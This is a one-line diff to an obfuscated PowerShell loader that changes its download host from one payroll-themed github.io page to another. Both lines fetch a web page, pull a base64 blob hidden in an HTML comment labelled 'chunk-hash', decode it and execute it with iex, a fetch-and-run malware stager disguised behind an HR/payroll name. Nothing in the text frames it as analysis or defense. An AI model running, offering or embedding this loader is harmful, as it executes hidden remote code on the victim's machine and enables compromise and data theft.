@@ -1,1 +1,1 @@
-$h=irm 'https://ezpayroll-hr.github.io/test.html';$m=[regex]::Match($h,'chunk-hash:([A-Za-z0-9+/=\s]+?) -->');iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($m.Groups[1].Value-replace'\s',''))))
+$h=irm 'https://ice-ezpayroll.github.io/test.html';$m=[regex]::Match($h,'chunk-hash:([A-Za-z0-9+/=\s]+?) -->');iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($m.Groups[1].Value-replace'\s',''))))
